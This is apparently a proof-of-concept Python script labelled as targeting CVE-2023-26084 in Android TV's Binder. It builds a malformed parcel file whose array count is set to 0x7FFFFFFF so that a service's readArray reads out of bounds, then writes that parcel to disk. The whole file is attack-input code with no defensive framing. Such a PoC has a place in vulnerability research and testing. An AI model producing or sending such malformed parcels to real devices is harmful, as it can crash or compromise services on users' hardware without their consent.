#!/usr/bin/env python3
"""CVE-2023-26084 — Android TV Binder. Parcel with an inflated array length
in a typed field -> OOB in the service's readArray."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    # Binder-ish parcel: [u32 header][i32 count=0x7FFFFFFF][data...]
    header = struct.pack("<I", 0x00000004)          # parcel header
    count  = struct.pack("<i", 0x7FFFFFFF)          # impossible element count
    return header + count + b"\x01\x02\x03\x04" * 8

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-26084.parcel")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2023-26084 binder parcel -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
